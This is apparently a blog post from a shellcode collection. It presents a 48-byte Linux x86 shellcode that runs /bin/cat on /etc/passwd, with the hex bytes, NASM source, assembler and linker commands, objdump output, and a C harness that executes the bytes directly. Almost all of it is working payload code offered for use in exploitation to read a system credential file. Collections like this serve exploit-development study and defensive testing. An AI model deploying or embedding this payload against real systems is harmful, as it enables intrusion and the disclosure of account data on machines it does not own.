---
title:  Linux/86 cat /etc/passwd -> Stack,XOR
date: 2022-06-03 05:49:33 +0800
categories: [Shellcodes, Linux]
tags: []  
---

# Info

Description: `Shellcode to retrive /etc/passwd file using /bin/cat`

Platform: `Linux`

Arch: `x86`

Size: `48 bytes`

Technique: `Stack`, `XOR`

Shellcode : `\x31\xc0\x50\x8d\x14\x24\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x34\x24\x50\x56\x53\x8d\x0c\x24\xb0\x0b\xcd\x80`

# Execution

![shellcode](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/shellcodes/l86catetcpasswdestackxor.png)

# Assembly-nasm

`nasm -f elf32 -o shellcode.o shellcode.asm`

`ld -o shellcode shellcode.o`

```nasm

global _start

section .text

_start:
    xor eax, eax

    push eax
    lea edx, [esp]

    ;/bin/cat
    
    push 0x7461632f
    push 0x6e69622f
    lea ebx, [esp]

    ;//etc/passwd0x00000000
    
    push eax
    push 0x64777373
    push 0x61702f63
    push 0x74652f2f
    lea esi, [esp]


    push eax
    push esi
    push ebx
    lea ecx, [esp]

    mov al, 0xb
    int 0x80

```
# objdump

`objdump -d ./shellcode -M intel`

```bash

./shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    eax,eax
 8048062:       50                      push   eax
 8048063:       8d 14 24                lea    edx,[esp]
 8048066:       68 2f 63 61 74          push   0x7461632f
 804806b:       68 2f 62 69 6e          push   0x6e69622f
 8048070:       8d 1c 24                lea    ebx,[esp]
 8048073:       50                      push   eax
 8048074:       68 73 73 77 64          push   0x64777373
 8048079:       68 63 2f 70 61          push   0x61702f63
 804807e:       68 2f 2f 65 74          push   0x74652f2f
 8048083:       8d 34 24                lea    esi,[esp]
 8048086:       50                      push   eax
 8048087:       56                      push   esi
 8048088:       53                      push   ebx
 8048089:       8d 0c 24                lea    ecx,[esp]
 804808c:       b0 0b                   mov    al,0xb
 804808e:       cd 80                   int    0x80


```

# C

`gcc -o shellcode shellcode.c`

```c

#include <stdio.h>                                                                                                                                                    
#include <string.h>                                                                                                                                                   
                                                                                                                                                                      
char *shellcode = "\x31\xc0\x50\x8d\x14\x24\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x34\x24\x50\x56\x53\x8d\x0c\x24\xb0\x0b\xcd\x80";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();
        return 0;
}

```

